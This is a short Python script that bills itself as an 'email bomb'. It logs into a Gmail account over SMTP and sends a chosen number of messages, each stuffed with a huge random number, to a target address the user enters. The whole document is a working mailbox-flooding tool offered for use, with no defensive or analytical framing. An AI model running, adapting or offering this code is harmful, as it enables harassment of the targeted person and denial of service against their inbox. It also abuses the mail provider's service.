import random
import smtplib


def email_bomb():
    email_id = str(input("Enter the Gmail Id::"))
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    server.login("Your Gmail ID", "#YOUR GMAIL Password")  # change according to ur gmail id and password
    lowerlimit=0
    uprlimit=int(input("Enter The Number Times YOU WANT TO BOMB ANY EMAIL\nWarning:\n'More The Number Longer The Time Taken'\n>>>"))
    while lowerlimit<uprlimit:
        gen = str(random.randint(10 ** 1000, 99 ** 1000))
        lowerlimit=lowerlimit+1
        server.sendmail("testpythonshubham@gmail.com", email_id,
                    "Subject:GGWP"  f"***********>>>>>{gen}<<<<<*************")
    print('Finished!')

email_bomb()
